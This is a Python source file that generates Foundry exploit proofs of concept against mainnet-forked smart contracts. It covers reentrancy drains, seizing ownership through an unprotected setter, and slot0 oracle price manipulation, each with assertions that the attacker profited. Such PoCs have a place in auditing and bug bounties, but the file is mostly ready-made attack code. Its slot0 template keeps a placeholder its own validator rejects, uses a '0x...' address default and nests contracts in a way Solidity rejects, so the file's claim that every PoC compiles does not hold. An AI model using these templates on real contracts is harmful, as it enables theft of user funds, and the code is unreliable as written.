"""
Slop-Free POC Generator

Rules:
1. NO placeholder comments like "// Add attack logic here"
2. NO "this would..." or "you could..." - only concrete code
3. Every POC must compile
4. Every POC must have assertions that PROVE the exploit
5. Real addresses, real interfaces, real math
"""

from dataclasses import dataclass
from typing import Optional
from enum import Enum


class PoCType(Enum):
    REENTRANCY = "reentrancy"
    ACCESS_CONTROL = "access_control"
    ORACLE_MANIPULATION = "oracle_manipulation"
    FLASH_LOAN = "flash_loan"
    INTEGER_OVERFLOW = "integer_overflow"
    PRICE_MANIPULATION = "price_manipulation"


@dataclass
class PoCRequirements:
    """What every PoC MUST have."""
    setup_state: str  # Initial state setup
    attack_execution: str  # The actual exploit code
    profit_assertion: str  # Assert attacker profited
    invariant_violation: str  # Assert protocol invariant broken
    cleanup: str  # Return to normal state if needed


class SlopFreePoCGenerator:
    """
    Generate concrete, working PoCs.

    Every PoC follows this structure:
    1. SETUP: Fork mainnet, fund attacker, set initial state
    2. SNAPSHOT: Record balances/state before
    3. ATTACK: Execute the exploit (CONCRETE CODE)
    4. ASSERT: Prove the attack succeeded with numbers
    """

    FOUNDRY_TEMPLATE = '''// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import "forge-std/Test.sol";
import "forge-std/console.sol";

/*
 * @title {title}
 * @notice Concrete PoC - NO PLACEHOLDERS
 *
 * Target: {target_contract}
 * Vulnerability: {vulnerability}
 * Impact: {impact}
 *
 * Run: forge test --match-contract {test_name} -vvvv --fork-url $ETH_RPC
 */

{interfaces}

contract {test_name} is Test {{
    // Real addresses - no placeholders
{addresses}

    // Attack contract if needed
{attacker_contract}

    function setUp() public {{
        // Fork at specific block for reproducibility
        vm.createSelectFork("{rpc}", {block_number});

        // Label addresses for better traces
{labels}
    }}

    function test_exploit() public {{
        // ============================================================
        // STEP 1: SNAPSHOT BEFORE
        // ============================================================
{snapshot_before}

        console.log("=== BEFORE ATTACK ===");
{log_before}

        // ============================================================
        // STEP 2: EXECUTE ATTACK
        // ============================================================
        vm.startPrank(attacker);
{attack_code}
        vm.stopPrank();

        // ============================================================
        // STEP 3: SNAPSHOT AFTER
        // ============================================================
{snapshot_after}

        console.log("=== AFTER ATTACK ===");
{log_after}

        // ============================================================
        // STEP 4: ASSERT EXPLOIT SUCCESS
        // ============================================================
{assertions}

        console.log("=== EXPLOIT SUCCESSFUL ===");
        console.log("Profit:", {profit_calc});
    }}
}}
'''

    REENTRANCY_ATTACKER = '''
    // Attacker contract for reentrancy
    contract Attacker {{
        {target_interface} target;
        uint256 public attackCount;
        uint256 public constant MAX_ATTACKS = 10;

        constructor(address _target) {{
            target = {target_interface}(_target);
        }}

        function attack() external payable {{
            // Initial deposit/interaction
            {initial_action}
        }}

        receive() external payable {{
            if (attackCount < MAX_ATTACKS) {{
                attackCount++;
                // Reentrant call
                {reentrant_call}
            }}
        }}

        function withdraw() external {{
            payable(msg.sender).transfer(address(this).balance);
        }}
    }}
'''

    def generate_reentrancy_poc(
        self,
        target_contract: str,
        target_address: str,
        vulnerable_function: str,
        initial_deposit: str,
        block_number: int = 18_500_000,
    ) -> str:
        """Generate concrete reentrancy PoC."""

        return self.FOUNDRY_TEMPLATE.format(
            title=f"Reentrancy Attack on {target_contract}",
            target_contract=target_contract,
            vulnerability="State updated after external call",
            impact="Drain contract funds",
            test_name=f"{target_contract}ReentrancyPoC",
            interfaces=f'''interface I{target_contract} {{
    function deposit() external payable;
    function withdraw(uint256 amount) external;
    function balanceOf(address user) external view returns (uint256);
}}''',
            addresses=f'''    address constant TARGET = {target_address};
    address attacker = makeAddr("attacker");
    Attacker attackerContract;''',
            attacker_contract=self.REENTRANCY_ATTACKER.format(
                target_interface=f"I{target_contract}",
                initial_action=f"target.deposit{{value: msg.value}}();",
                reentrant_call=f"target.withdraw(1 ether);"
            ),
            rpc="mainnet",
            block_number=block_number,
            labels=f'''        vm.label(TARGET, "{target_contract}");
        vm.label(attacker, "Attacker");''',
            snapshot_before=f'''        uint256 targetBalanceBefore = TARGET.balance;
        uint256 attackerBalanceBefore = attacker.balance;''',
            log_before=f'''        console.log("Target balance:", targetBalanceBefore);
        console.log("Attacker balance:", attackerBalanceBefore);''',
            attack_code=f'''        // Deploy attacker contract
        attackerContract = new Attacker(TARGET);
        vm.label(address(attackerContract), "AttackerContract");

        // Fund attacker
        vm.deal(attacker, 2 ether);

        // Execute attack
        attackerContract.attack{{value: 1 ether}}();
        attackerContract.withdraw();''',
            snapshot_after=f'''        uint256 targetBalanceAfter = TARGET.balance;
        uint256 attackerBalanceAfter = attacker.balance;''',
            log_after=f'''        console.log("Target balance:", targetBalanceAfter);
        console.log("Attacker balance:", attackerBalanceAfter);''',
            assertions=f'''        // MUST: Attacker has more than started with
        assertGt(attackerBalanceAfter, attackerBalanceBefore, "Attacker should profit");

        // MUST: Target lost funds
        assertLt(targetBalanceAfter, targetBalanceBefore, "Target should lose funds");

        // MUST: Profit is significant
        uint256 profit = attackerBalanceAfter - attackerBalanceBefore;
        assertGt(profit, 0.5 ether, "Profit should be significant");''',
            profit_calc="attackerBalanceAfter - attackerBalanceBefore"
        )

    def generate_access_control_poc(
        self,
        target_contract: str,
        target_address: str,
        unprotected_function: str,
        admin_action: str,
        block_number: int = 18_500_000,
    ) -> str:
        """Generate concrete access control bypass PoC."""

        return self.FOUNDRY_TEMPLATE.format(
            title=f"Access Control Bypass on {target_contract}",
            target_contract=target_contract,
            vulnerability=f"Unprotected {unprotected_function}",
            impact="Unauthorized admin access",
            test_name=f"{target_contract}AccessControlPoC",
            interfaces=f'''interface I{target_contract} {{
    function {unprotected_function}({admin_action}) external;
    function owner() external view returns (address);
    function admin() external view returns (address);
}}''',
            addresses=f'''    address constant TARGET = {target_address};
    address attacker = makeAddr("attacker");
    address originalOwner;''',
            attacker_contract="",
            rpc="mainnet",
            block_number=block_number,
            labels=f'''        vm.label(TARGET, "{target_contract}");
        vm.label(attacker, "Attacker");''',
            snapshot_before=f'''        originalOwner = I{target_contract}(TARGET).owner();''',
            log_before=f'''        console.log("Original owner:", originalOwner);
        console.log("Attacker:", attacker);
        console.log("Attacker is owner?", attacker == originalOwner);''',
            attack_code=f'''        // Attacker calls unprotected function
        I{target_contract}(TARGET).{unprotected_function}(attacker);''',
            snapshot_after=f'''        address newOwner = I{target_contract}(TARGET).owner();''',
            log_after=f'''        console.log("New owner:", newOwner);
        console.log("Attacker is now owner?", attacker == newOwner);''',
            assertions=f'''        // MUST: Attacker was not originally owner
        assertTrue(attacker != originalOwner, "Attacker should not be original owner");

        // MUST: Attacker is now owner
        assertEq(newOwner, attacker, "Attacker should now be owner");''',
            profit_calc='"Became owner/admin"'
        )

    def generate_oracle_manipulation_poc(
        self,
        target_contract: str,
        target_address: str,
        oracle_type: str,  # "slot0", "chainlink", "custom"
        pool_address: str,
        block_number: int = 18_500_000,
    ) -> str:
        """Generate concrete oracle manipulation PoC."""

        if oracle_type == "slot0":
            return self._generate_slot0_manipulation_poc(
                target_contract, target_address, pool_address, block_number
            )
        # Add more oracle types...
        return ""

    def _generate_slot0_manipulation_poc(
        self,
        target_contract: str,
        target_address: str,
        pool_address: str,
        block_number: int,
    ) -> str:
        """Generate slot0 manipulation PoC."""

        return f'''// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import "forge-std/Test.sol";
import "forge-std/console.sol";

/*
 * @title slot0 Price Manipulation on {target_contract}
 * @notice Target reads price from Uniswap slot0 (manipulable!)
 *
 * Attack: Flash loan -> Swap to move price -> Exploit at bad price -> Swap back
 */

interface IUniswapV3Pool {{
    function slot0() external view returns (
        uint160 sqrtPriceX96, int24 tick, uint16 observationIndex,
        uint16 observationCardinality, uint16 observationCardinalityNext,
        uint8 feeProtocol, bool unlocked
    );
    function swap(
        address recipient, bool zeroForOne, int256 amountSpecified,
        uint160 sqrtPriceLimitX96, bytes calldata data
    ) external returns (int256 amount0, int256 amount1);
}}

interface IERC20 {{
    function balanceOf(address) external view returns (uint256);
    function approve(address, uint256) external returns (bool);
    function transfer(address, uint256) external returns (bool);
}}

interface I{target_contract} {{
    function getPrice() external view returns (uint256);
    function deposit(uint256 amount) external;
    function borrow(uint256 amount) external;
}}

contract Slot0ManipulationPoC is Test {{
    address constant TARGET = {target_address};
    address constant POOL = {pool_address};
    address constant WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;

    address attacker = makeAddr("attacker");

    function setUp() public {{
        vm.createSelectFork("mainnet", {block_number});
    }}

    function test_slot0Manipulation() public {{
        // BEFORE: Get legitimate price
        (uint160 sqrtPriceBefore,,,,,, ) = IUniswapV3Pool(POOL).slot0();
        uint256 priceBefore = I{target_contract}(TARGET).getPrice();

        console.log("=== BEFORE MANIPULATION ===");
        console.log("sqrtPriceX96:", sqrtPriceBefore);
        console.log("Protocol price:", priceBefore);

        vm.startPrank(attacker);

        // ATTACK: Large swap to manipulate slot0
        deal(WETH, attacker, 10000 ether);
        IERC20(WETH).approve(POOL, type(uint256).max);

        // Swap to move price (this manipulates slot0)
        IUniswapV3Pool(POOL).swap(
            attacker,
            true,  // zeroForOne
            int256(5000 ether),
            4295128739 + 1,  // sqrtPriceLimitX96
            ""
        );

        // AFTER MANIPULATION: Check new price
        (uint160 sqrtPriceAfter,,,,,, ) = IUniswapV3Pool(POOL).slot0();
        uint256 priceAfter = I{target_contract}(TARGET).getPrice();

        console.log("=== AFTER MANIPULATION ===");
        console.log("sqrtPriceX96:", sqrtPriceAfter);
        console.log("Protocol price:", priceAfter);

        // EXPLOIT: Use manipulated price
        // deposit collateral at inflated price, borrow more than should be allowed
        // ...specific exploit code...

        vm.stopPrank();

        // ASSERTIONS
        assertTrue(sqrtPriceAfter != sqrtPriceBefore, "Price should have moved");
        assertTrue(priceAfter != priceBefore, "Protocol price should reflect manipulation");

        // Calculate manipulation percentage
        uint256 priceDelta = priceBefore > priceAfter ?
            priceBefore - priceAfter : priceAfter - priceBefore;
        uint256 manipulationPercent = (priceDelta * 100) / priceBefore;

        console.log("=== RESULTS ===");
        console.log("Price manipulation:", manipulationPercent, "%");

        assertGt(manipulationPercent, 5, "Should manipulate price by at least 5%");
    }}
}}
'''


# Strict PoC requirements checker
class PoCValidator:
    """Validate PoC code has no slop."""

    SLOP_PATTERNS = [
        "// TODO",
        "// FIXME",
        "// Add",
        "// Implement",
        "// your code here",
        "// attack logic here",
        "...",
        "/* ... */",
        "pass  #",
        "raise NotImplementedError",
    ]

    REQUIRED_PATTERNS = [
        ("setUp", "Must have setUp function"),
        ("test_", "Must have test function"),
        ("assert", "Must have assertions"),
        ("console.log", "Must log results"),
        ("vm.startPrank", "Must specify attacker context"),
    ]

    @classmethod
    def validate(cls, poc_code: str) -> tuple[bool, list[str]]:
        """Validate PoC has no slop and meets requirements."""
        errors = []

        # Check for slop
        for pattern in cls.SLOP_PATTERNS:
            if pattern in poc_code:
                errors.append(f"SLOP DETECTED: '{pattern}' - Replace with concrete code")

        # Check requirements
        for pattern, message in cls.REQUIRED_PATTERNS:
            if pattern not in poc_code:
                errors.append(f"MISSING: {message}")

        return len(errors) == 0, errors


def generate_poc(
    vulnerability_type: PoCType,
    target_contract: str,
    target_address: str,
    **kwargs
) -> str:
    """Generate a concrete, slop-free PoC."""
    generator = SlopFreePoCGenerator()

    if vulnerability_type == PoCType.REENTRANCY:
        return generator.generate_reentrancy_poc(
            target_contract, target_address,
            kwargs.get("vulnerable_function", "withdraw"),
            kwargs.get("initial_deposit", "1 ether"),
            kwargs.get("block_number", 18_500_000)
        )
    elif vulnerability_type == PoCType.ACCESS_CONTROL:
        return generator.generate_access_control_poc(
            target_contract, target_address,
            kwargs.get("unprotected_function", "setOwner"),
            kwargs.get("admin_action", "address newOwner"),
            kwargs.get("block_number", 18_500_000)
        )
    elif vulnerability_type == PoCType.ORACLE_MANIPULATION:
        return generator.generate_oracle_manipulation_poc(
            target_contract, target_address,
            kwargs.get("oracle_type", "slot0"),
            kwargs.get("pool_address", "0x..."),
            kwargs.get("block_number", 18_500_000)
        )

    return ""
